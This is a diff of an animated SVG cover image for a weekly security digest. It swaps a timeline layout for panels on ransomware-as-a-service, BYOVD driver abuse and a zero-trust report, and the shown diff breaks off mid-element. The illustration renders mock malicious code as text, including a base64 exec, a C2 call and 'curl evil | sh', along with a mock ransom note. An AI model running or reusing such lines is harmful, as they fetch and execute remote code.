@@ -1,323 +1,47 @@
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 630" width="1200" height="630" role="img" aria-label="Research-based weekly digest cover: SK Shieldus Zero Trust Visibility report, Trump Media crypto expansion and X ad policy change, AI Agent Ransomware defense strategy">
-<!-- profile: high-quality-cover (L14 Timeline, research-based, batch3a-locked) -->
-<title>Weekly digest 2026-03-02 timeline: Zero Trust Visibility (Feb 24), Crypto Regulation Trump Media X (Feb 28), AI Agent Ransomware Defense (Mar 02)</title>
-<defs>
-  <linearGradient id="bgSpread" x1="0%" y1="0%" x2="100%" y2="100%">
-    <stop offset="0%" stop-color="#0A1226"/>
-    <stop offset="55%" stop-color="#0D1530"/>
-    <stop offset="100%" stop-color="#131038"/>
-  </linearGradient>
-  <linearGradient id="colA" x1="0%" y1="0%" x2="0%" y2="100%">
-    <stop offset="0%" stop-color="#122542"/>
-    <stop offset="100%" stop-color="#0A1830"/>
-  </linearGradient>
-  <linearGradient id="colB" x1="0%" y1="0%" x2="0%" y2="100%">
-    <stop offset="0%" stop-color="#2E1A0A"/>
-    <stop offset="100%" stop-color="#1E1006"/>
-  </linearGradient>
-  <linearGradient id="colC" x1="0%" y1="0%" x2="0%" y2="100%">
-    <stop offset="0%" stop-color="#2E1016"/>
-    <stop offset="100%" stop-color="#1E0A12"/>
-  </linearGradient>
-  <linearGradient id="timelineGrad" x1="0%" y1="0%" x2="100%" y2="0%">
-    <stop offset="0%" stop-color="#4ADE80" stop-opacity="0.2"/>
-    <stop offset="35%" stop-color="#3A86FF" stop-opacity="0.9"/>
-    <stop offset="65%" stop-color="#FFB703" stop-opacity="0.9"/>
-    <stop offset="100%" stop-color="#E63946"/>
-  </linearGradient>
-  <radialGradient id="glowBlue" cx="50%" cy="50%" r="50%">
-    <stop offset="0%" stop-color="#3A86FF" stop-opacity="0.6"/>
-    <stop offset="100%" stop-color="#3A86FF" stop-opacity="0"/>
-  </radialGradient>
-  <radialGradient id="glowAmber" cx="50%" cy="50%" r="50%">
-    <stop offset="0%" stop-color="#FFB703" stop-opacity="0.6"/>
-    <stop offset="100%" stop-color="#FFB703" stop-opacity="0"/>
-  </radialGradient>
-  <radialGradient id="glowRed" cx="50%" cy="50%" r="50%">
-    <stop offset="0%" stop-color="#E63946" stop-opacity="0.65"/>
-    <stop offset="100%" stop-color="#E63946" stop-opacity="0"/>
-  </radialGradient>
-  <pattern id="dotGrid" x="0" y="0" width="40" height="40" patternUnits="userSpaceOnUse">
-    <circle cx="20" cy="20" r="0.8" fill="#2A3256" opacity="0.55"/>
-  </pattern>
-  <filter id="softShadow" x="-10%" y="-10%" width="130%" height="130%">
-    <feGaussianBlur in="SourceAlpha" stdDeviation="2.6"/>
-    <feOffset dx="1" dy="3"/>
-    <feComponentTransfer><feFuncA type="linear" slope="0.55"/></feComponentTransfer>
-    <feMerge><feMergeNode/><feMergeNode in="SourceGraphic"/></feMerge>
-  </filter>
-  <filter id="textShadow" x="-5%" y="-5%" width="110%" height="110%">
-    <feGaussianBlur in="SourceAlpha" stdDeviation="1.2"/>
-    <feOffset dx="0" dy="1.5"/>
-    <feComponentTransfer><feFuncA type="linear" slope="0.8"/></feComponentTransfer>
-    <feMerge><feMergeNode/><feMergeNode in="SourceGraphic"/></feMerge>
-  </filter>
-</defs>
-
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 630" width="1200" height="630" role="img" aria-label="Weekly digest cover 2026.03.02: Ransomware-as-a-Service Surge, BYOVD Driver Sideload, SK Shieldus Zero Trust">
+<!-- profile: high-quality-cover (L20 Hero+2-Card) -->
+<title>Weekly digest 2026-03-02: ransomware, BYOVD EDR, SK Shieldus zero-trust report</title>
+<defs><linearGradient id="bgSpread" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#0B1326"/><stop offset="55%" stop-color="#0D1530"/><stop offset="100%" stop-color="#141034"/></linearGradient><linearGradient id="heroPanel" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stop-color="#1A0A08"/><stop offset="100%" stop-color="#110608"/></linearGradient><linearGradient id="heroPanelBlue" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stop-color="#0A1A30"/><stop offset="100%" stop-color="#071426"/></linearGradient><linearGradient id="heroPanelAmber" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stop-color="#1A1208"/><stop offset="100%" stop-color="#120E06"/></linearGradient><linearGradient id="heroPanelGreen" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stop-color="#08160E"/><stop offset="100%" stop-color="#04100A"/></linearGradient><linearGradient id="heroPanelPurple" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stop-color="#110629"/><stop offset="100%" stop-color="#0A0418"/></linearGradient><radialGradient id="hotRed" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="#E63946" stop-opacity="0.6"/><stop offset="100%" stop-color="#E63946" stop-opacity="0"/></radialGradient><radialGradient id="hotBlue" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="#3A86FF" stop-opacity="0.5"/><stop offset="100%" stop-color="#3A86FF" stop-opacity="0"/></radialGradient><radialGradient id="hotAmber" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="#FFB703" stop-opacity="0.45"/><stop offset="100%" stop-color="#FFB703" stop-opacity="0"/></radialGradient><radialGradient id="hotGreen" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="#4ADE80" stop-opacity="0.45"/><stop offset="100%" stop-color="#4ADE80" stop-opacity="0"/></radialGradient><radialGradient id="hotPurple" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="#A78BFA" stop-opacity="0.45"/><stop offset="100%" stop-color="#A78BFA" stop-opacity="0"/></radialGradient><pattern id="envGrid" x="0" y="0" width="40" height="40" patternUnits="userSpaceOnUse"><circle cx="20" cy="20" r="0.8" fill="#2A3256" opacity="0.55"/></pattern><filter id="softShadow" x="-10%" y="-10%" width="130%" height="130%"><feGaussianBlur in="SourceAlpha" stdDeviation="3"/><feOffset dx="2" dy="4"/><feComponentTransfer><feFuncA type="linear" slope="0.55"/></feComponentTransfer><feMerge><feMergeNode/><feMergeNode in="SourceGraphic"/></feMerge></filter><filter id="textShadow" x="-10%" y="-10%" width="130%" height="130%"><feGaussianBlur in="SourceAlpha" stdDeviation="1.2"/><feOffset dx="1" dy="1.5"/><feComponentTransfer><feFuncA type="linear" slope="0.7"/></feComponentTransfer><feMerge><feMergeNode/><feMergeNode in="SourceGraphic"/></feMerge></filter></defs>
 <rect width="1200" height="630" fill="url(#bgSpread)"/>
-<rect width="1200" height="630" fill="url(#dotGrid)"/>
-
-<!-- Ambient glows behind columns -->
-<circle cx="240" cy="400" r="140" fill="url(#glowBlue)">
-  <animate attributeName="opacity" values="0.5;0.85;0.5" dur="6.4s" repeatCount="indefinite"/>
-</circle>
-<circle cx="620" cy="400" r="140" fill="url(#glowAmber)">
-  <animate attributeName="opacity" values="0.5;0.85;0.5" dur="5.6s" repeatCount="indefinite"/>
-</circle>
-<circle cx="1000" cy="400" r="140" fill="url(#glowRed)">
-  <animate attributeName="opacity" values="0.5;0.85;0.5" dur="7.0s" repeatCount="indefinite"/>
-</circle>
-
-<!-- Header bar -->
+<rect width="1200" height="630" fill="url(#envGrid)"/>
+<circle cx="310" cy="310" r="160" fill="url(#hotRed)"><animate attributeName="opacity" values="0.6;1;0.6" dur="5.8s" repeatCount="indefinite"/></circle><circle cx="950" cy="210" r="120" fill="url(#hotBlue)"><animate attributeName="opacity" values="0.45;0.85;0.45" dur="6.4s" repeatCount="indefinite"/></circle><circle cx="970" cy="480" r="110" fill="url(#hotAmber)"><animate attributeName="opacity" values="0.4;0.75;0.4" dur="7.1s" repeatCount="indefinite"/></circle><g fill="#8FB8FF"><circle cx="180" cy="70" r="1.2"><animate attributeName="opacity" values="0.2;1;0.2" dur="3.4s" repeatCount="indefinite"/></circle><circle cx="440" cy="62" r="1"><animate attributeName="opacity" values="0.2;0.9;0.2" dur="4.2s" repeatCount="indefinite"/></circle><circle cx="740" cy="68" r="1.3"><animate attributeName="opacity" values="0.25;1;0.25" dur="3.9s" repeatCount="indefinite"/></circle><circle cx="1060" cy="74" r="0.9"><animate attributeName="opacity" values="0.2;0.85;0.2" dur="5.1s" repeatCount="indefinite"/></circle><circle cx="90" cy="580" r="1"><animate attributeName="opacity" values="0.15;0.8;0.15" dur="4.7s" repeatCount="indefinite"/></circle><circle cx="550" cy="590" r="0.8"><animate attributeName="opacity" values="0.2;0.75;0.2" dur="3.6s" begin="0.5s" repeatCount="indefinite"/></circle></g>
 <rect x="0" y="0" width="1200" height="56" fill="#050813" opacity="0.92"/>
 <text x="36" y="36" font-family="Inter, Helvetica, Arial, sans-serif" font-size="18" font-weight="700" fill="#8FB8FF" letter-spacing="2.5">WEEKLY DIGEST</text>
 <text x="1164" y="36" font-family="Inter, Helvetica, Arial, sans-serif" font-size="15" font-weight="600" fill="#7DA3D9" letter-spacing="1.5" text-anchor="end">2026.03.02</text>
-<rect x="0" y="54" width="1200" height="2" fill="#8FB8FF" opacity="0.85">
-  <animate attributeName="opacity" values="0.4;1;0.4" dur="4.8s" repeatCount="indefinite"/>
-</rect>
-
-<!-- Starfield ambient dots -->
-<g fill="#8FB8FF">
-  <circle cx="160" cy="78" r="1.2"><animate attributeName="opacity" values="0.2;1;0.2" dur="3.1s" repeatCount="indefinite"/></circle>
-  <circle cx="420" cy="86" r="1.0"><animate attributeName="opacity" values="0.2;0.9;0.2" dur="4.4s" repeatCount="indefinite"/></circle>
-  <circle cx="720" cy="80" r="1.3"><animate attributeName="opacity" values="0.25;1;0.25" dur="3.7s" repeatCount="indefinite"/></circle>
-  <circle cx="1040" cy="88" r="0.9"><animate attributeName="opacity" values="0.2;0.85;0.2" dur="5.2s" repeatCount="indefinite"/></circle>
+<rect x="0" y="54" width="1200" height="2" fill="#E63946" opacity="0.85"><animate attributeName="opacity" values="0.4;1;0.4" dur="4.8s" repeatCount="indefinite"/></rect>
+<rect x="32" y="80" width="600" height="510" rx="14" ry="14" fill="url(#heroPanel)" stroke="#E63946" stroke-width="1.8" opacity="0.98"/>
+<circle cx="160" cy="300" r="240" fill="url(#hotRed)" opacity="0.28"/>
+<rect x="32" y="80" width="600" height="4" fill="#E63946" opacity="0.85"><animate attributeName="opacity" values="0.5;1;0.5" dur="3.4s" repeatCount="indefinite"/></rect>
+<g filter="url(#textShadow)">
+<text x="54" y="112" font-family="Inter, Helvetica, Arial, sans-serif" font-size="13" font-weight="700" fill="#F87171" letter-spacing="3">RANSOMWARE  /  01</text>
+<text x="54" y="146" font-family="Inter, Helvetica, Arial, sans-serif" font-size="31" font-weight="800" fill="#F8FAFC">Ransomware-as-a-Service Surge</text>
+<text x="54" y="174" font-family="Inter, Helvetica, Arial, sans-serif" font-size="17" font-weight="500" fill="#FBB6BD">Affiliate-driven ransomware operations expand to commodity</text>
 </g>
-
-<g>
-  <text x="60" y="96" font-family="Inter, Helvetica, Arial, sans-serif" font-size="13" font-weight="700" fill="#9FD3B0" letter-spacing="3">THIS WEEK  /  FEB 24 - MAR 02</text>
-  <text x="60" y="130" font-family="Inter, Helvetica, Arial, sans-serif" font-size="28" font-weight="800" fill="#F5F7FA" filter="url(#textShadow)">Zero Trust, Crypto Policy, AI Agent Defense</text>
+<g transform="translate(332,360)"><g transform="translate(-100,-90)" filter="url(#softShadow)"><rect x="0" y="32" width="80" height="64" rx="8" fill="#E63946"/><path d="M14 32 L14 16 Q40 -6 66 16 L66 32" stroke="#E63946" stroke-width="6" fill="none" stroke-linecap="round"/><circle cx="40" cy="60" r="6" fill="#FFFFFF"/><rect x="38" y="62" width="4" height="14" fill="#FFFFFF"/><text x="40" y="116" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="900" fill="#F87171">LOCKED</text></g><g transform="translate(20,-90)" filter="url(#softShadow)"><rect x="0" y="0" width="180" height="180" rx="8" fill="#0A0C16" stroke="#E63946" stroke-width="1.4"/><text x="90" y="22" text-anchor="middle" font-family="Inter, monospace" font-size="11" font-weight="900" fill="#F87171">RANSOM NOTE</text><line x1="14" y1="32" x2="166" y2="32" stroke="#E63946" stroke-width="0.8" opacity="0.6"/><g font-family="Inter, monospace" font-size="9" font-weight="600" fill="#FCA5A5"><text x="14" y="50">Files encrypted: 100%</text><text x="14" y="68">AES-256 + RSA-4096</text><text x="14" y="86">Backups deleted</text><text x="14" y="104">Volume shadow wiped</text></g><rect x="14" y="118" width="152" height="22" rx="3" fill="#2A0808" stroke="#E63946" stroke-width="1.2"><animate attributeName="stroke-opacity" values="0.6;1;0.6" dur="1.6s" repeatCount="indefinite"/></rect><text x="90" y="133" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="900" fill="#FFFFFF">PAY OR LOSE DATA</text><g transform="translate(14,148)" font-family="Inter, monospace" font-size="8" font-weight="700" fill="#FFB703"><rect x="0" y="0" width="152" height="20" rx="3" fill="#1A1208" stroke="#FFB703" stroke-width="1"/><text x="76" y="14" text-anchor="middle">countdown  /  72h window</text></g></g></g>
+<g transform="translate(54,548)">
+<rect x="0" y="0" width="280" height="24" rx="3" fill="#E63946" opacity="0.95"/>
+<text x="140" y="17" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="700" fill="#FFFFFF">ISOLATE + ROTATE KEYS + IR DRILL</text>
 </g>
-
-<!-- Timeline axis y=170 -->
-<line x1="60" y1="170" x2="1140" y2="170" stroke="url(#timelineGrad)" stroke-width="3.4" stroke-linecap="round"/>
-<!-- Moving traveler dot -->
-<circle r="5" fill="#F5F7FA" stroke="#8FB8FF" stroke-width="1.4">
-  <animate attributeName="cx" values="60;1140;60" dur="11s" repeatCount="indefinite"/>
-  <animate attributeName="cy" values="170;170;170" dur="11s" repeatCount="indefinite"/>
-  <animate attributeName="opacity" values="0;1;1;1;0" dur="11s" repeatCount="indefinite"/>
-</circle>
-
-<!-- 7 date ticks: FEB 24 to MAR 02 (+ MAR 03 as right endpoint) -->
-<g font-family="Inter, monospace" font-size="10" font-weight="700" fill="#7DA3D9">
-  <line x1="80" y1="163" x2="80" y2="177" stroke="#4A6AA0" stroke-width="1.2"/>
-  <text x="80" y="194" text-anchor="middle">FEB 24</text>
-  <line x1="240" y1="163" x2="240" y2="177" stroke="#4A6AA0" stroke-width="1.2"/>
-  <text x="240" y="194" text-anchor="middle" fill="#8FB8FF">FEB 25</text>
-  <line x1="400" y1="163" x2="400" y2="177" stroke="#4A6AA0" stroke-width="1.2"/>
-  <text x="400" y="194" text-anchor="middle">FEB 26</text>
-  <line x1="600" y1="163" x2="600" y2="177" stroke="#4A6AA0" stroke-width="1.2"/>
-  <text x="600" y="194" text-anchor="middle" fill="#FFB703">FEB 28</text>
-  <line x1="800" y1="163" x2="800" y2="177" stroke="#4A6AA0" stroke-width="1.2"/>
-  <text x="800" y="194" text-anchor="middle">MAR 01</text>
-  <line x1="980" y1="163" x2="980" y2="177" stroke="#4A6AA0" stroke-width="1.2"/>
-  <text x="980" y="194" text-anchor="middle" fill="#F87171">MAR 02</text>
-  <line x1="1120" y1="163" x2="1120" y2="177" stroke="#4A6AA0" stroke-width="1.2"/>
-  <text x="1120" y="194" text-anchor="middle">MAR 03</text>
+<text x="350" y="566" font-family="Inter, Helvetica, Arial, sans-serif" font-size="13" font-weight="600" fill="#A5B4C4" font-style="italic">Weekly Digest  /  2026.03.02</text>
+<rect x="652" y="80" width="516" height="248" rx="14" ry="14" fill="url(#heroPanelAmber)" stroke="#FFB703" stroke-width="1.6" opacity="0.97"/>
+<rect x="652" y="80" width="516" height="4" fill="#FFB703" opacity="0.85"><animate attributeName="opacity" values="0.5;1;0.5" dur="4.2s" repeatCount="indefinite"/></rect>
+<g filter="url(#textShadow)">
+<text x="670" y="110" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="700" fill="#FFB703" letter-spacing="3">BYOVD EDR  /  02</text>
+<text x="670" y="140" font-family="Inter, Helvetica, Arial, sans-serif" font-size="24" font-weight="800" fill="#F5F7FA">BYOVD Driver Sideload</text>
+<text x="670" y="163" font-family="Inter, Helvetica, Arial, sans-serif" font-size="14" font-weight="500" fill="#FFD58A">Vulnerable-driver families sideload to disable EDR</text>
 </g>
-
-<!-- 3 anchor dots on timeline: FEB 25 (blue), FEB 28 (amber), MAR 02 (red) -->
-<g>
-  <g transform="translate(240,170)">
-    <circle r="22" fill="url(#glowBlue)">
-      <animate attributeName="r" values="20;32;20" dur="2.8s" repeatCount="indefinite"/>
-      <animate attributeName="opacity" values="0.6;1;0.6" dur="2.8s" repeatCount="indefinite"/>
-    </circle>
-    <circle r="10" fill="#0A1B2E" stroke="#3A86FF" stroke-width="3" filter="url(#softShadow)"/>
-    <circle r="3.5" fill="#8FB8FF">
-      <animate attributeName="opacity" values="1;0.3;1" dur="1.6s" repeatCount="indefinite"/>
-    </circle>
-  </g>
-  <g transform="translate(600,170)">
-    <circle r="22" fill="url(#glowAmber)">
-      <animate attributeName="r" values="20;32;20" dur="2.8s" begin="0.4s" repeatCount="indefinite"/>
-      <animate attributeName="opacity" values="0.6;1;0.6" dur="2.8s" begin="0.4s" repeatCount="indefinite"/>
-    </circle>
-    <circle r="10" fill="#1E1006" stroke="#FFB703" stroke-width="3" filter="url(#softShadow)"/>
-    <circle r="3.5" fill="#FFD58A">
-      <animate attributeName="opacity" values="1;0.3;1" dur="1.8s" repeatCount="indefinite"/>
-    </circle>
-  </g>
-  <g transform="translate(980,170)">
-    <circle r="22" fill="url(#glowRed)">
-      <animate attributeName="r" values="20;32;20" dur="2.8s" begin="0.8s" repeatCount="indefinite"/>
-      <animate attributeName="opacity" values="0.6;1;0.6" dur="2.8s" begin="0.8s" repeatCount="indefinite"/>
-    </circle>
-    <circle r="10" fill="#1E0A14" stroke="#E63946" stroke-width="3" filter="url(#softShadow)"/>
-    <circle r="3.5" fill="#FCA5A5">
-      <animate attributeName="opacity" values="1;0.3;1" dur="1.7s" repeatCount="indefinite"/>
-    </circle>
-  </g>
+<g transform="translate(800,230)" filter="url(#softShadow)"><rect x="-150" y="-90" width="300" height="180" rx="8" fill="#0A0C16" stroke="#FFB703" stroke-width="1.4"/><rect x="-150" y="-90" width="300" height="22" rx="8" fill="#1A1820"/><g transform="translate(-138,-79)"><circle cx="0" cy="0" r="3" fill="#E63946"/><circle cx="10" cy="0" r="3" fill="#FFB703"/><circle cx="20" cy="0" r="3" fill="#4ADE80"/></g><text x="0" y="-74" text-anchor="middle" font-family="Inter, monospace" font-size="9" font-weight="700" fill="#BFC9D9">payload.py  /  injected</text><g font-family="Inter, monospace" font-size="9" font-weight="600"><text x="-138" y="-50" fill="#7DA3D9">  1  import os, base64</text><text x="-138" y="-34" fill="#7DA3D9">  2  from urllib import request</text><text x="-138" y="-18" fill="#7DA3D9">  3</text><rect x="-148" y="-12" width="296" height="18" fill="#FFB703" opacity="0.22"/><text x="-138" y="0" fill="#FFD58A">  4  exec(base64.b64decode(PAYLOAD))</text><text x="-138" y="16" fill="#7DA3D9">  5  request.urlopen(C2_URL)</text><text x="-138" y="32" fill="#7DA3D9">  6  os.system("curl evil | sh")</text><text x="-138" y="48" fill="#7DA3D9">  7  # exfil_keys()</text><text x="-138" y="64" fill="#7DA3D9">  8  # persist_cron()</text></g><g transform="translate(118,0)"><circle cx="0" cy="0" r="14" fill="#FFB703" opacity="0.7"><animate attributeName="r" values="10;16;10" dur="1.4s" repeatCount="indefinite"/></circle><text x="0" y="3" text-anchor="middle" font-family="Inter, monospace" font-size="9" font-weight="900" fill="#FFFFFF">RCE</text></g><g fill="#FFD58A"><circle r="2"><animateMotion path="M120 0 L150 -40" dur="1.6s" repeatCount="indefinite"/></circle><circle r="2" opacity="0.7"><animateMotion path="M120 0 L150 -40" dur="1.6s" begin="0.5s" repeatCount="indefinite"/></circle></g></g>
+<g transform="translate(1094,168)" filter="url(#softShadow)"><rect x="-68" y="-55" width="140" height="110" rx="10" fill="#1A1208" stroke="#FFB703" stroke-width="2"/><text x="2" y="-28" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="700" letter-spacing="2" fill="#FFB703">DRIVER</text><text x="2" y="18" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="28" font-weight="900" fill="#F5F7FA">BYO</text><text x="2" y="40" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="600" fill="#FFD58A">killbit</text></g>
+<rect x="652" y="344" width="516" height="246" rx="14" ry="14" fill="url(#heroPanelBlue)" stroke="#3A86FF" stroke-width="1.6" opacity="0.97"/>
+<rect x="652" y="344" width="516" height="4" fill="#3A86FF" opacity="0.85"><animate attributeName="opacity" values="0.5;1;0.5" dur="4.8s" repeatCount="indefinite"/></rect>
+<g filter="url(#textShadow)">
+<text x="670" y="374" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="700" fill="#7DA3D9" letter-spacing="3">ZERO TRUST  /  03</text>
+<text x="670" y="404" font-family="Inter, Helvetica, Arial, sans-serif" font-size="24" font-weight="800" fill="#F5F7FA">SK Shieldus Zero Trust</text>
+<text x="670" y="428" font-family="Inter, Helvetica, Arial, sans-serif" font-size="14" font-weight="500" fill="#BFC9D9">SK Shieldus February brief - zero trust visibility</text>
 </g>
-
-<!-- Dashed drop lines from anchors to columns -->
-<line x1="240" y1="180" x2="240" y2="216" stroke="#3A86FF" stroke-width="1.4" stroke-dasharray="3 3" opacity="0.7"/>
-<line x1="600" y1="180" x2="600" y2="216" stroke="#FFB703" stroke-width="1.4" stroke-dasharray="3 3" opacity="0.7"/>
-<line x1="980" y1="180" x2="980" y2="216" stroke="#E63946" stroke-width="1.4" stroke-dasharray="3 3" opacity="0.7"/>
-
-<!-- COL A: Zero Trust Visibility (SK Shieldus, Feb 25) -->
-<g transform="translate(72,216)">
-  <rect x="0" y="0" width="336" height="374" rx="14" fill="url(#colA)" stroke="#3A86FF" stroke-width="1.6" opacity="0.97"/>
-  <rect x="0" y="0" width="336" height="4" fill="#3A86FF" opacity="0.7"/>
-  <g filter="url(#textShadow)">
-    <text x="20" y="28" font-family="Inter, Helvetica, Arial, sans-serif" font-size="11" font-weight="700" fill="#8FB8FF" letter-spacing="2.4">HIGH  /  ZERO TRUST</text>
-    <text x="20" y="54" font-family="Inter, Helvetica, Arial, sans-serif" font-size="20" font-weight="800" fill="#F5F7FA">Zero Trust Visibility</text>
-    <text x="20" y="76" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="500" fill="#BFC9D9">SK Shieldus Special Report</text>
-  </g>
-  <!-- Scene: rotating visibility rings + eye -->
-  <g transform="translate(168,138)">
-    <circle r="44" fill="none" stroke="#3A86FF" stroke-width="1.2" stroke-dasharray="6 4" opacity="0.5">
-      <animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="12s" repeatCount="indefinite"/>
-    </circle>
-    <circle r="30" fill="none" stroke="#8FB8FF" stroke-width="1.4" stroke-dasharray="4 3" opacity="0.7">
-      <animateTransform attributeName="transform" type="rotate" from="360" to="0" dur="8s" repeatCount="indefinite"/>
-    </circle>
-    <ellipse rx="22" ry="12" fill="#0A1B2E" stroke="#3A86FF" stroke-width="2" filter="url(#softShadow)"/>
-    <circle r="7" fill="#3A86FF" opacity="0.9"/>
-    <circle r="3" fill="#F5F7FA"/>
-    <circle cx="2" cy="-2" r="1" fill="#FFFFFF" opacity="0.7"/>
-  </g>
-  <!-- 3-step chain -->
-  <g transform="translate(28,202)">
-    <rect x="0" y="0" width="280" height="34" rx="6" fill="#0A1B2E" stroke="#3A86FF" stroke-width="1.2"/>
-    <circle cx="18" cy="17" r="7" fill="#3A86FF"/>
-    <text x="18" y="21" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="800" fill="#FFFFFF">1</text>
-    <text x="36" y="22" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="700" fill="#F5F7FA">Network traffic visibility</text>
-    <line x1="18" y1="38" x2="18" y2="50" stroke="#3A86FF" stroke-width="1.4" stroke-dasharray="2 2"/>
-    <g transform="translate(0,54)">
-      <rect x="0" y="0" width="280" height="34" rx="6" fill="#0A1B2E" stroke="#3A86FF" stroke-width="1.2"/>
-      <circle cx="18" cy="17" r="7" fill="#3A86FF"/>
-      <text x="18" y="21" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="800" fill="#FFFFFF">2</text>
-      <text x="36" y="22" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="700" fill="#F5F7FA">Endpoint behavior analytics</text>
-    </g>
-    <line x1="18" y1="92" x2="18" y2="104" stroke="#3A86FF" stroke-width="1.4" stroke-dasharray="2 2"/>
-    <g transform="translate(0,108)">
-      <rect x="0" y="0" width="280" height="34" rx="6" fill="#12283F" stroke="#8FB8FF" stroke-width="1.4"/>
-      <circle cx="18" cy="17" r="7" fill="#8FB8FF"/>
-      <text x="18" y="21" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="800" fill="#0A1020">3</text>
-      <text x="36" y="22" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="800" fill="#F5F7FA">Identity access monitoring</text>
-    </g>
-  </g>
-  <!-- KPI pill -->
-  <g transform="translate(28,342)" filter="url(#softShadow)">
-    <rect x="0" y="0" width="280" height="26" rx="8" fill="#12283F" stroke="#3A86FF" stroke-width="1.6"/>
-    <text x="14" y="18" font-family="Inter, monospace" font-size="10" font-weight="700" fill="#8FB8FF">PILLAR</text>
-    <text x="140" y="19" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="14" font-weight="900" fill="#F5F7FA">3-LAYER ZT</text>
-    <text x="266" y="18" text-anchor="end" font-family="Inter, monospace" font-size="10" font-weight="700" fill="#8FB8FF">SIEM</text>
-  </g>
-</g>
-
-<!-- COL B: Crypto Regulation (Trump Media + X, Feb 28) -->
-<g transform="translate(432,216)">
-  <rect x="0" y="0" width="336" height="374" rx="14" fill="url(#colB)" stroke="#FFB703" stroke-width="1.6" opacity="0.97"/>
-  <rect x="0" y="0" width="336" height="4" fill="#FFB703" opacity="0.7"/>
-  <g filter="url(#textShadow)">
-    <text x="20" y="28" font-family="Inter, Helvetica, Arial, sans-serif" font-size="11" font-weight="700" fill="#FFB703" letter-spacing="2.4">MEDIUM  /  CRYPTO REG</text>
-    <text x="20" y="54" font-family="Inter, Helvetica, Arial, sans-serif" font-size="20" font-weight="800" fill="#F5F7FA">Crypto Regulation Shift</text>
-    <text x="20" y="76" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="500" fill="#FFD58A">Trump Media + X ad policy</text>
-  </g>
-  <!-- Scene: coin + orbiting policy dot -->
-  <g transform="translate(168,138)">
-    <circle r="44" fill="none" stroke="#FFB703" stroke-width="1.0" stroke-dasharray="5 5" opacity="0.4">
-      <animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="14s" repeatCount="indefinite"/>
-    </circle>
-    <circle r="28" fill="#2E1A0A" stroke="#FFB703" stroke-width="2.5" filter="url(#softShadow)"/>
-    <text x="0" y="8" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="22" font-weight="900" fill="#FFB703">$</text>
-    <circle cx="44" cy="0" r="5" fill="#FFD58A" opacity="0.9">
-      <animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="4.5s" repeatCount="indefinite"/>
-    </circle>
-    <g transform="translate(0,42)">
-      <rect x="-30" y="-10" width="60" height="18" rx="4" fill="#1E1006" stroke="#FFB703" stroke-width="1.2"/>
-      <text x="0" y="4" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="800" fill="#FFD58A">POLICY</text>
-    </g>
-  </g>
-  <!-- 3-step chain -->
-  <g transform="translate(28,202)">
-    <rect x="0" y="0" width="280" height="34" rx="6" fill="#1E1006" stroke="#FFB703" stroke-width="1.2"/>
-    <circle cx="18" cy="17" r="7" fill="#FFB703"/>
-    <text x="18" y="21" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="800" fill="#1A1202">1</text>
-    <text x="36" y="22" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="700" fill="#F5F7FA">Trump Media crypto expansion</text>
-    <line x1="18" y1="38" x2="18" y2="50" stroke="#FFB703" stroke-width="1.4" stroke-dasharray="2 2"/>
-    <g transform="translate(0,54)">
-      <rect x="0" y="0" width="280" height="34" rx="6" fill="#1E1006" stroke="#FFB703" stroke-width="1.2"/>
-      <circle cx="18" cy="17" r="7" fill="#FFB703"/>
-      <text x="18" y="21" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="800" fill="#1A1202">2</text>
-      <text x="36" y="22" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="700" fill="#F5F7FA">X crypto promo labeling policy</text>
-    </g>
-    <line x1="18" y1="92" x2="18" y2="104" stroke="#FFB703" stroke-width="1.4" stroke-dasharray="2 2"/>
-    <g transform="translate(0,108)">
-      <rect x="0" y="0" width="280" height="34" rx="6" fill="#2E1A0A" stroke="#FFD58A" stroke-width="1.4"/>
-      <circle cx="18" cy="17" r="7" fill="#FFD58A"/>
-      <text x="18" y="21" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="800" fill="#1A1202">3</text>
-      <text x="36" y="22" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="800" fill="#F5F7FA">Compliance policy update needed</text>
-    </g>
-  </g>
-  <!-- KPI pill -->
-  <g transform="translate(28,342)" filter="url(#softShadow)">
-    <rect x="0" y="0" width="280" height="26" rx="8" fill="#2E1A0A" stroke="#FFB703" stroke-width="1.6"/>
